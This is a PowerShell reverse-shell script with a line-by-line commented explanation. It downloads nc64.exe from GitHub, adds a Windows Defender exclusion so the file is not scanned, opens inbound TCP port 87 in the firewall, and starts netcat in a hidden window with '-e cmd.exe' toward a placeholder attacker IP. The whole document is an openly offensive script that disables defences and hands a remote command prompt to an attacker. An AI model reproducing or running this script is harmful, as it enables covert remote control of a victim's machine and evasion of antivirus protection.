$url = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe'
$outputPath = "$env:USERPROFILE\Downloads\nc64.exe"

# Download the file from the specified URL and save it to the output path
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Add an exclusion for nc64.exe in Windows Security (Windows Defender)
Add-MpPreference -ExclusionPath $outputPath

# Set up a firewall rule to allow incoming connections on port 87
New-NetFirewallRule -DisplayName "Allow incoming connections on port 87" -Direction Inbound -LocalPort 87 -Protocol TCP -Action Allow

# Run nc64.exe with administrator privileges and hide the window
Start-Process -FilePath $outputPath -WindowStyle Hidden -ArgumentList "Attacker_IP", "87", "-e", "cmd.exe"





#######################################
# Explanation of the script:

# Set the URL from which to download the nc64.exe file
$url = 'https://github.com/int0x33/nc.exe/raw/master/nc64.exe'

# Set the output path where the downloaded file will be saved
$outputPath = "$env:USERPROFILE\Downloads\nc64.exe"

# Download the file from the specified URL and save it to the output path
Invoke-WebRequest -Uri $url -OutFile $outputPath

# Add an exclusion for nc64.exe in Windows Security (Windows Defender)
# This ensures that the file is not scanned or flagged as malicious by the antivirus software
Add-MpPreference -ExclusionPath $outputPath

# Set up a firewall rule to allow incoming connections on port 87
# This rule allows inbound traffic on TCP port 87
New-NetFirewallRule -DisplayName "Allow incoming connections on port 87" -Direction Inbound -LocalPort 87 -Protocol TCP -Action Allow

# Run nc64.exe with administrator privileges and hide the window
# nc64.exe is executed with the specified command-line arguments:
# "Attacker_IP": The IP address of the attacker
# "87": The port on which the connection will be established
# "-e": Specifies the command to execute ("-e cmd.exe" will run the command prompt)
Start-Process -FilePath $outputPath -WindowStyle Hidden -ArgumentList "Attacker_IP", "87", "-e", "cmd.exe"
#######################################
